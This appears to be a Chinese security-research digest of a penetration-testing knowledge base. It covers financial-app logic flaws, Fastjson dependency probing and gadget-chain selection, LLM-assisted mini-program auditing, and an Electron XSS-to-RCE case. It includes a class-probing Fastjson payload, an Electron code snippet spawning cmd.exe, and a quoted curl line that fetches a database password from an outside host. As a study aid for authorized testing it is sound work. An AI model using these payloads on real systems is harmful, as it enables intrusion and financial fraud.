# 订阅知识库「网络安全知识库」案例沉淀

> 生成日期：2026-09-15
> 素材来源：ima 订阅知识库「网络安全知识库」（knowledge_base_id = `7304699371875661`，创建者 空.，共 **1616 项**，描述"src，渗透，攻防，代码审计"）
> 处置方式：**不全量翻**（1616 份里 Nday / 工具 / 培训文占比高）。采用「顶层普查 → 挑高价值精读 → 小目录兜底」三段式，实读 **5 篇**（金融 SRC 场景 / Fastjson 打法 / LLM 辅助小程序审计 / Electron 客户端 RCE / 政务攻防演练），顶层 ≈30 项做标题+简介级归类。
> 定位：本库是**打法密度**最高的订阅库，补上了技能此前三类空白——**金融场景逻辑漏洞、Fastjson 依赖探测打法、LLM 驱动的审计工作流**。
> ⚠️ 红线：本文件所有内容仅作授权测试（SRC/EDUSRC/攻防演练授权范围内）与防守认知。金融并发提现、负值反冲等只留判据与现象描述，不留可直接套用的批量脚本；小程序签名只留算法结构，不留真实 key/盐值。

---

## §1 金融 SRC 各场景漏洞挖掘（全文精读，价值最高）

> 原文：道一安全《金融SRC各场景漏洞挖掘技巧》
> media_id：`wechatarticle_083dde0149e2b9cdd48154d8718bfebe_edb31918284a4a764c5b2a7d24e5e5c87304699371875661`

核心前提（原文反复强调）：**金融类挖的不只是技术点，是"设计缺陷"** —— 要理解业务链路、资金流转规则、风控策略与账户体系，才能在流程节点上找到突破口。

### 1.1 注册开户场景

正常开户流程：姓名/手机号/KYC → 人脸识别（含 deepfake 判定）→ 信息一致性校验 → 开户成功。

| 手法 | 要点 |
|------|------|
| **绕过信息校验开户** | 手机号/邮箱/身份证往往只在**前端正则**校验；传参是「组件数组」结构（`components[].component_value`）时，**后端只取传过来的字段**，直接删掉手机相关组件仍可正常开户 |
| **KYC 信息复用伪造** | 上传证件 → SDK 加签入库 → OCR 提取比对。**后端为省资源优先查缓存**"这张证件传过没有" → 同一套证件（身份证正反面+人脸）可开多个账户 |
| **申请状态查询越权** | 找「申请/状态查询」接口，改 `request_id` / `orderNo` / `ticketId` / `userId` 重放 → 遍历拿到他人**手机号+身份证+银行卡**（实例：request_id 从 1 遍历到 952，响应长度 856/861/1254/1357 分层，命中即全量三要素） |

### 1.2 支付场景

| 手法 | 判据 |
|------|------|
| **高并发下单/提现** | 后端无分布式锁 → Burp 一秒内多次提交 → 成功创建多笔提现订单（实例：连开 10 笔 -20,000,000） |
| **负值反冲** | 支付/退款接口金额参数传**负数**，后端未校验必须为正 → 余额不减反增。实例：`promotion_quantity: -1` 仍正常创单返回 `err_code:0` |
| **int64 金额溢出** | 后端常用 `金额 × 精度(10000/100000)`，int64 上限 9.22e18，**Go 不会自动检查溢出、高位直接截掉** → 传入极大值可让 price/amount 变成负数或 0.01 |
| **篡改参数免手续费** | 结算涉及渠道/汇率/活动多参数参与运算；实例：`xx_id` 传 0 时 `campaign_result.code == 0`，绕过 `GetFeeWaivedAmount() != 0` 的校验分支实现零手续费转账 |

### 1.3 优惠券场景

- **券码爆破**：券码未加密 + 网关无限流 → 高并发遍历 `voucher_code`，按**响应长度**判定存在与否（实例：存在 820/819，不存在 798）
- **无锁重复领取**：对比加锁版（`coupon.mu.Lock()`）与无锁版（只 `atomic.AddInt64(UsageCount,1)`）——无锁版读写非原子，可重复核销
- **叠加使用**：本应互斥的券可在单笔订单同时使用

### 1.4 信息查询场景

- **越权查询 + 隐藏参数 fuzz**：函数实现是「**优先取 POST 的 userid，其次解 token 取 uid**」，而正常调用 POST 体是 `{}` 走到第二优先级 → 只改 token 测不出来。**做法：把 history 返回包里的字段（userphone / uid / role）攒成字典去 fuzz 参数名**，fuzz 出 `uid` 即可越权
- **ToC/ToB 网关配置错误、接口混用**（gRPC + Gateway 架构高发）：生成的 HTTP 路由没绑权限检查，或 Gateway 拦截器配置错误导致 token 被忽略/默认当 admin。
  - **实操：把管理端域名（a.com）的 Burp history 导出 → 拿到管理员接口清单 → 用普通用户 token 去 ToC 端（b.com）重放**
  - 转换脚本思路（原文给出，可复用）：`Save item` 导出 XML → `<request>` 内容 Base64 解码 → 按 `\r\n\r\n` 切 header/body → 提取方法、路径、POST 内容 → 写 CSV → Intruder **Pitchfork** 模式发包，取消 payload encoding

### 1.5 资源存储 / SSRF / 第三方

| 场景 | 手法 |
|------|------|
| 合同资料遍历 | 合同/发票存于可预测路径（`/docs/contract/2025/ID_0001.pdf`）→ 递增 ID 批量下载 |
| 对象存储 | S3/OSS Bucket 误配 Public Read（工具：cloudTools） |
| SSRF 绕过 | 企业常配**域名白名单** → 找白名单域名下的可控跳转/URL 参数绕过，触发 dnslog 即证明 |
| 第三方厂商 | ① 初始化脚本里**硬编码 appid + JWT 密钥**且未改 → 可伪造任意用户 token；② **运维后门**：代码里 `curl http://password.example.com/db-prod-pass` 拉密码、甚至从 SSO 外部接口取最新系统密码 |

---

## §2 Fastjson 实战打法：不看版本看依赖（全文精读）

> 原文：UpRoot《记一次edu站点的fastjson打法》
> media_id：`wechatarticle_083dde0149e2b9cdd48154d8718bfebe_d9e4858c5b1c4656c7a87231627292d07304699371875661`

原文金句：**"对于打 fastjson，无非知识面决定攻击面，你知道多少，你就能打多少。"** 全流程四步：

### 2.1 四步走

1. **看出网** —— 该站 **DNS 不出网但 LDAP 出网**（DNSLog 无记录 ≠ 完全不出网，必须分别验证）
2. **看版本** —— 报错链直接吐版本。发 `{"@type":"java.lang.AutoCloseable"}`（故意少闭合括号）触发 `JSON parse error: syntax error, expect[, actual EOF, pos 2, **fastjson-version 1.2.47**`
3. **看依赖（最关键，技能此前无此打法）** —— 依赖探测只有三招：**DNS / 延时 / 报错**。有报错就打报错：
   ```json
   {"x":{"@type":"java.lang.Character","@type":"java.lang.Class","val":"<目标类名>"}}
   ```
   - 类**存在** → 回显 `can not cast to char, value : class <类名>`
   - 类**不存在** → 正常回显
   - 用这招依次探：`org.apache.tomcat.dbcp.dbcp.BasicDataSource`（tomcat-dbcp-7）/ `dbcp2.BasicDataSource`（8+）→ 判 BCEL；`com.sun.org.apache.bcel.internal.util.ClassLoader` → 判 JDK（本例推导出 **JDK < 8u251**）
4. **选链** ——
   - 出网：`JdbcRowSetImpl` + `dataSourceName: ldap://` + `autoCommit:true`
   - 不出网：BCEL（`com.sun.org.apache.bcel.internal.util.ClassLoader`）
   - 本地反序列化：`CCK1`（需 `org.apache.commons.collections.Transformer` + `TemplatesImpl` 都在）→ **CC 3.2.1+ 默认禁用 `InvokerTransformer` 序列化**，报错会明说需 `org.apache.commons.collections.enableUnsafeSerialization=true`，遇到这条就说明 CCK1 打不了 → 转 **CB 链**（探 `org.apache.commons.beanutils.BeanComparator` 存在即可）
   - 工具链：`Javachains` 生成 LDAP 反序列化 payload（CCK1/CBK1~4、TomcatDbcp*JNDI、RMIConnector 二次反序列化等预设链）+ `jmg` 打 Tomcat 回显马

### 2.2 可复用的经验

- **别一上来就生成 payload 去打**（原文吐槽"未免有点脚本小子"），先探依赖再定链，成功率与说服力都更高
- 报错信息本身就是**信息泄露金矿**：`HttpMessageNotReadableException` 的栈会连 `FastJsonHttpMessageConverter.java:205` 一起给，能反推 Spring 版本与集成方式
- 拿到 RCE 后内存马打不上不要死磕（本例 jmg 无果），换 vshell 一键上线；`java -version` 确认落地环境

---

## §3 LLM 辅助审计工作流：小程序逆向 + HTTP Raw 投喂（全文精读）

> 原文：Megadotnet《实战利用LLM辅助小程序逆向与HTTP报文漏洞挖掘》
> media_id：`wechatarticle_083dde0149e2b9cdd48154d8718bfebe_54ba69beec0e9e409bfe4dcb8c8b0df27304699371875661`
> 定位：**本文件 §3 与 `subkb-dig-ideas-cases.md` §4「AI 漏洞专章」互为补充** —— 那边是"AI 应用本身的漏洞"，这边是"**用 AI 当审计员挖传统漏洞**"。

### 3.1 工作流（五步，可标准化）

```
Fiddler 抓包 ──Save All Sessions as Text──> HTTP Raw 报文 ──┐
                                                            ├─> LLM 安全智能体 ─> ① 签名算法还原
小程序解包 ──KillWxapkg──> 提取 vendor.js ──> 混淆加密逻辑 ─┘                    ② 漏洞评估报告
                                                                                        │
                                                                                  人工验证与复现
```

### 3.2 关键细节

- **小程序包位置（微信 4.1 后）**：`C:\Users\<用户名>\AppData\Roaming\Tencent\xwechat\radium\Applet\packages`
- **解包**：`KillWxapkg -id=wx<appid> -in="__APP__.wxapkg" --restore`
- **定位加密点**：全文搜 `getSignatureHeader(`（或 `signature` / `nonce` / `salt`），通常落在 `common/vendor.js`
- **去混淆**：先用在线 JS 解密工具（如 webfem 的 js-decode）还原，再投喂 LLM
- **实例还原结果**：`MD5("xt" + nonce(16位) + fixedUrl + timestamp + salt(14位))`，且**请求体含 phone 字段时 phone 参与签名**——LLM 不只还原算法，还指出"哪个接口走哪种拼接"
- 抓包/审计工具：Fiddler Classic（导出 Raw Text 比 Burp 方便）；LLM 用 GLM-4.6 实测有效

### 3.3 Prompt 三段式（决定成败）

| 反面教材 | 正确做法 |
|---------|---------|
| "帮我分析这段 HTTP 报文有没有安全漏洞" → AI 泛泛而谈"建议使用 HTTPS"，对实战无用 | **① 角色设定**："你是一名拥有 20 年经验的 Web 网络安全专家，擅长从红队和蓝队双重视角思考…"（激活领域深层知识）<br>**② 任务约束**："必须基于提供的 HTTP Raw 文本分析，**严禁编造不存在的字段**，重点关注逻辑漏洞（越权、未授权访问）"（压幻觉）<br>**③ 输出格式**："以 JSON 输出：漏洞名称、风险等级、证据片段、修复建议"（便于后续自动化） |

### 3.4 两条红线（必须遵守）

1. **数据隐私** —— 切勿把含真实 Token / Cookie / 内部代码的 Raw 报文直接发公有云 LLM。投喂前脚本脱敏（`Authorization: Bearer [MASKED]`），高机密场景用本地开源模型或私有化部署。
2. **幻觉** —— "信任，但要验证"（Trust, but Verify）。**LLM 是副驾驶，方向盘必须在人手里**，所有 AI 报的漏洞必须人工复现或脚本验证才能确认。上下文不够（长链路电商下单流程）时拆段投喂或上 RAG。

### 3.5 LLM 相对人工的真实优势（原文对比表）

| 维度 | 人工审计 | LLM 辅助 |
|------|---------|---------|
| 上下文理解 | 容易忽略 Header 细节（如 Authorization 为空） | 全量扫描，精准抓字段缺失 |
| 敏感数据识别 | 肉眼过滤 | 自动提取手机号/地址等隐私字段 |
| 风险关联 | 只盯技术漏洞（上传 shell） | **业务视角**，能推出"非法图床/资源耗尽"等滥用场景 |
| 效率 | 单接口数分钟 | 秒级出结构化报告 |

> 实战成果：IDOR（`/api/guest/portal/details/1010` 改 1009 即换人，泄露完整手机号、详细地址、家庭成员、经济状况、婚姻状况）+ **未授权上传变"非法图床"**（`/base/file/upload` 的 `Authorization` 为空即可调用，风险不止 getshell，还包括被黑产当免费图床分发非法内容导致域名被封、法律风险）。

---

## §4 客户端漏洞：Electron RCE（全文精读，技能此前无此类）

> 原文：迪哥讲事《Electron客户端RCE》
> media_id：`wechatarticle_083dde0149e2b9cdd48154d8718bfebe_e0289ec833fe0bd0fd6ee52b977aa2507304699371875661`

**场景**：Electron 笔记应用支持 Markdown → Markdown 里塞 `<img src="x" onerror="...">` → 渲染进程执行 JS。

**从 XSS 到 RCE 的关键**：Electron 若开了 `nodeIntegration`（且 `contextIsolation:false`），页面 JS 可直接调 Node 底层：

```js
var Process = process.binding('process_wrap').Process;  // 非公开 API，直连 Node 底层
var proc = new Process();
proc.onexit = function(a,b){};
var env_ = []; for (key in process.env) env_.push(key+'='+process.env[key]);
proc.spawn({
  file: 'cmd.exe',
  args: ['/c netplwiz'],
  cwd: null, windowsVerbatimArguments: false, detached: false,
  envPairs: env_, stdio: [{type:'ignore'},{},{type:'ignore'}]
});
```

**打法要点**：
- 入口不止 Markdown —— 一切会渲染到 Electron 页面的用户输入（笔记/消息/富文本/预览）都是面
- `process.binding('process_wrap')` 是老版本写法；新版本走 `process.binding` 受限后要找其他 Node API 出口
- 判定顺序：先确认是否 Electron（看进程/about 页/`electron` 字样）→ 试 XSS → 试能否访问 `require`/`process` → 决定 RCE 路径
- 参考：HackerOne `#291539`

---

## §5 本库结构普查与未读清单（供后续定向取用）

### 5.1 子目录（folder_id 已备，可直接列）

| 目录 | folder_id | 规模 | 价值预判 |
|------|-----------|------|---------|
| 00.红队攻击手-第十一期课件笔记 | `folder_7384401562330191` | 43 | 培训课件，体系化但偏基础；缺体系时可翻 |
| 安卓安全 | `folder_7408762906217970` | 4 | 与 `mobile-cases.md` 互补 |
| 客户端漏洞挖掘 | `folder_7389120720538304` | 4 | **中高**（§4 只取到 1 篇，其余 3 篇待读） |
| 网安文章 | `folder_7384405899220950` | 5 + 5 子目录 | 待探 |
| 代码审计 / ai渗透 / 物联网 / 应急响应 / 小程序 / 逆向 | `folder_7413868213066035` / `7413515887334477` / `7411957921491657` / `7411312904637213` / `7409882680528005` / `7391045201440557` | 各 1 | ai渗透 已读（即 §3）；其余待读 |

### 5.2 顶层高价值未读（标题级登记，未读不臆造内容）

| 文章 | 规模 | 价值预判 |
|------|------|---------|
| 睡了个觉+花费2元，AI挖出我的第一个 IOT RCE 漏洞 | 41KB | **高**（AI + IoT 双空白，可扩写 AI 专章与 IoT） |
| SQL注入挖洞已死？月入过万的SRC猎手正在用这些"过时"技巧疯狂淘金 | 50KB | **中高**（SQLi 打法，可能与 `sqli-cases` 重叠需去重） |
| 从JS审计到拿下扑克牌系统后台 | 30KB | **中高**（JS 审计实战，补 `js-reverse-guide`） |
| 某米C400智能摄像头的逆向分析与漏洞利用 | 50KB | 中（IoT 固件逆向，`vendor-system-cases` §七 网络设备方向） |
| 超越403：一份给赏金猎人的进阶绕过手册（PDF） | 407KB | 中（**PDF `can_fetch_content:false`**，只能取简介；简介已含伪造 IP 头绕过清单，可取用） |
| TongWeb 最新反序列化漏洞分析（PDF） | 1.1MB | 中（PDF 不可 fetch；简介已点明 `ejbserver/ejb#` 反序列化入口，够当指纹线索） |
| 记一次edu站点的fastjson打法 | — | ✅ 已读（§2） |
| Java 幽灵比特位(Ghost Bits) 工具推荐 | 69KB | 低（技能已有 `ghost-bits-cast-test.md` 专篇） |

### 5.3 明确低价值 / 与本技能无关（已排除，不再读）

- **Nday 复现类**：React2Shell (CVE-2025-55182) 系列 4 篇、CVE-2026-34040 Docker 授权绕过、CVE-2025-52665、Spring-Gateway RCE（2022-22947 & 2025-41243）、GeoServer XXE CVE-2025-58360、Cherry Studio CVE-2025-61929、Sangfor OSM CVE-2025-12916 —— 属 `nday-watchlist-2026.md` 范畴，不进案例库
- **蓝队/威胁情报类**：银狐木马报告、Shai-Hulud 2.0、CNCERT 国家授时中心技术分析 —— 防守侧，非挖洞素材
- **行业八卦/培训广告**：网安培训圈诈骗、面试题、Shadowrend 框架推广
- **政务行业攻防演练思路**（media_id `..._d2ffb1003d888cfc0dde70aff12d19627304699371875661`）：**踩坑记录** —— 原文是 PPT 转公众号图文，ima 只能拿到图片 OCR 的 alt 文本，**噪声极大、几乎没有可用正文**。教训：看到"沙龙/课件/演讲实录"类标题，先看 introduction 是否为图片 OCR，若是则跳过。

---

## §6 与既有文件的合并指引

| 本文件章节 | 去向 |
|-----------|------|
| §1 金融场景（开户/支付/优惠券/查询/存储/SSRF/第三方） | → `logic-web-cases.md`（并发、负值、金额、券码三连为新增手法）；ToC/ToB 网关混用 + 隐藏参数 fuzz → `idor-cases.md`；对象存储/合同遍历 → `infoleak-cases.md` |
| §2 Fastjson 依赖探测打法 | → `deserialization`（若无专篇则入 `code-audit-cases.md`）—— **`{"@type":"java.lang.Character","@type":"java.lang.Class","val":"xxx"}` 探类存在** 应提升为通用技巧，不止 fastjson，凡是 JSON 反序列化报错回显的场景都可用 |
| §3 LLM 辅助审计工作流 | → `subkb-dig-ideas-cases.md` §4 AI 专章（作为"AI 的第二种用法"）；小程序解包段 → `mobile-cases.md` |
| §4 Electron RCE | → `mobile-cases.md` 或新建"客户端/桌面应用"小节（技能此前无桌面端 RCE 案例） |
| §5 未读清单 | 留在 `ima-retrieval-index.md` 作为下次定向检索的靶子 |

## §7 本轮读取记录

| 状态 | 条目 |
|------|------|
| ✅ 全文精读 5 篇 | 金融SRC场景技巧、记一次edu站点fastjson打法、LLM辅助小程序逆向与HTTP报文挖掘、Electron客户端RCE、政务攻防演练（读后判定低价值） |
| 📋 简介级归类 | 顶层 ≈30 项（Nday/蓝队/八卦三类已排除，见 §5.3） |
| ⏳ 未读（已登记） | 见 §5.2，共 7 篇；其中 PDF 3 份 `can_fetch_content:false`，只能取简介 |

**踩坑（可复用）**：
1. `get_knowledge_list` 的 `limit` 上限 **50**（传 60 报 `value must be inside range (0, 50]`）
2. **PDF 类 `can_fetch_content:false`** —— 本库大量资料是 PDF（TongWeb、403 绕过手册、iOS 沙箱逃逸、Hacking GraalVM），ima 侧拿不到正文，只能靠 introduction，或去 ima 客户端打开
3. **图片化公众号文 = 正文为 OCR alt 噪声** —— 见 §5.3 政务篇，遇到"沙龙/课件"类先看 introduction 形态
